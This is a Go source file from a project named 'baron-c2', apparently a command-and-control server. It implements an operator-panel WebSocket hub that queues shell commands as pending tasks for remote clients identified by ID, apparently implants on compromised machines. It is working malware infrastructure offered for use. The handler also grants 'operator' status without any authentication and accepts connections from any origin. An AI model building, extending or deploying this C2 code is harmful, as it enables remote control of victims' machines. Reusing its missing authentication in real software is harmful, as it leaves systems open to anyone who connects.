package api

import (
	"encoding/json"
	"net/http"
	"sync"
	"time"

	"baron-c2/internal/repo"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/rs/zerolog/log"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// Hub maintains the set of active clients and broadcasts messages
type Hub struct {
	clients    map[*websocket.Conn]bool
	broadcast  chan interface{}
	register   chan *websocket.Conn
	unregister chan *websocket.Conn
	mu         sync.Mutex
}

var GlobalHub = &Hub{
	clients:    make(map[*websocket.Conn]bool),
	broadcast:  make(chan interface{}),
	register:   make(chan *websocket.Conn),
	unregister: make(chan *websocket.Conn),
}

func (h *Hub) Run() {
	for {
		select {
		case client := <-h.register:
			h.mu.Lock()
			h.clients[client] = true
			h.mu.Unlock()
		case client := <-h.unregister:
			h.mu.Lock()
			if _, ok := h.clients[client]; ok {
				delete(h.clients, client)
				client.Close()
			}
			h.mu.Unlock()
		case message := <-h.broadcast:
			h.mu.Lock()
			for client := range h.clients {
				err := client.WriteJSON(message)
				if err != nil {
					log.Warn().Err(err).Msg("websocket write error, dropping client")
					client.Close()
					delete(h.clients, client)
				}
			}
			h.mu.Unlock()
		}
	}
}

// wsIncoming represents a message sent FROM the panel TO the server over WebSocket
type wsIncoming struct {
	Event string          `json:"event"`
	Data  json.RawMessage `json:"data"`
}

// wsCommand is the payload for a "command" event from the panel
type wsCommand struct {
	CID    string `json:"cid"`
	Action string `json:"action"`
	Cmd    string `json:"cmd"`     // optional shell command string
}

// WSHandler handles websocket requests from the panel.
// It now processes incoming messages (commands) instead of dropping them.
func WSHandler(c *gin.Context) {
	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Warn().Err(err).Msg("websocket upgrade failed")
		return
	}

	GlobalHub.register <- conn

	defer func() {
		GlobalHub.unregister <- conn
	}()

	// Send auth_ok immediately so the panel UI activates
	conn.WriteJSON(gin.H{
		"event": "auth_ok",
		"data":  gin.H{"user": "operator"},
	})

	for {
		_, raw, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var msg wsIncoming
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}

		switch msg.Event {
		case "auth":
			// Already handled above; ignore
		case "command":
			handleWSCommand(msg.Data)
		case "subscribe_stream":
			// TODO: stream subscription logic
		}
	}
}

// handleWSCommand receives a command from the panel WebSocket,
// saves it as a pending task in the DB, and broadcasts confirmation.
func handleWSCommand(raw json.RawMessage) {
	var cmd wsCommand
	if err := json.Unmarshal(raw, &cmd); err != nil {
		log.Warn().Err(err).Msg("ws command: failed to parse")
		return
	}

	if cmd.CID == "" || cmd.Action == "" {
		log.Warn().Str("cid", cmd.CID).Str("action", cmd.Action).Msg("ws command: missing cid or action")
		return
	}

	fullCmd := cmd.Action
	if cmd.Cmd != "" {
		fullCmd += " " + cmd.Cmd
	}

	task := repo.Task{
		ID:        repo.GenerateID(),
		ClientID:  cmd.CID,
		Command:   fullCmd,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	if err := repo.DB.Create(&task).Error; err != nil {
		log.Error().Err(err).Str("cid", cmd.CID).Msg("ws command: db error")
		return
	}

	log.Info().Str("cid", cmd.CID).Str("cmd", fullCmd).Str("task_id", task.ID).Msg("task queued via ws")

	// Notify all panel clients about the queued task
	Broadcast(gin.H{
		"event": "task_queued",
		"data": gin.H{
			"cid":     cmd.CID,
			"task_id": task.ID,
			"task":    gin.H{"action": cmd.Action},
		},
	})

	GlobalHub.BroadcastSystem("TASK: <" + cmd.Action + "> queued for " + cmd.CID + " (id: " + task.ID[:8] + ")")
}

// Broadcast sends a message to all connected panel users
func Broadcast(msg interface{}) {
	GlobalHub.broadcast <- msg
}

// BroadcastSystem sends a system message to the panel terminal
func (h *Hub) BroadcastSystem(msg string) {
	Broadcast(gin.H{
		"event": "log_sys",
		"data":  gin.H{"msg": msg},
	})
}
